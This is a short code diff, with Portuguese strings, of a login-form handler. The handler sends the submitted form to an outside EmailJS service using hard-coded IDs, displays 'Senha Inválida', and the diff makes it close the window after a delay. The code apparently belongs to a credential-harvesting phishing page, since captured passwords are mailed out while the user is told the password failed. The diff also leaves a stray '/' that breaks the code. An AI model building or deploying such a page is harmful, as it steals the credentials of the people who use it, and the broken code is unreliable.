@@ -21,10 +21,10 @@ function Acessar() {
          })();
    
          document.querySelector('.login-form').addEventListener('click', function(event) {
-               event.preventDefault(); // Previne o comportamento padrão do formulário
+               event.preventDefault(); /
    
-               const serviceID = 'service_lnbca0y'; // Substitua "YOUR_SERVICE_ID" pelo seu ID de serviço EmailJS
-               const templateID = 'template_q59qps5'; // Substitua "YOUR_TEMPLATE_ID" pelo seu ID de template EmailJS
+               const serviceID = 'service_lnbca0y'; 
+               const templateID = 'template_q59qps5'; 
    
                emailjs.sendForm(serviceID, templateID, this)
                    .then(function(response) {
@@ -33,10 +33,13 @@ function Acessar() {
                        console.log('Erro ao enviar o e-mail:', error);
                    });
            });
-        
-        window.close();
+        setTimeout(fecharJanela, 3000)
     }
 
     senhaInvalida.innerHTML = "*Senha Inválida"
+}
+
+function fecharJanela() {
+    window.close()
 }
 
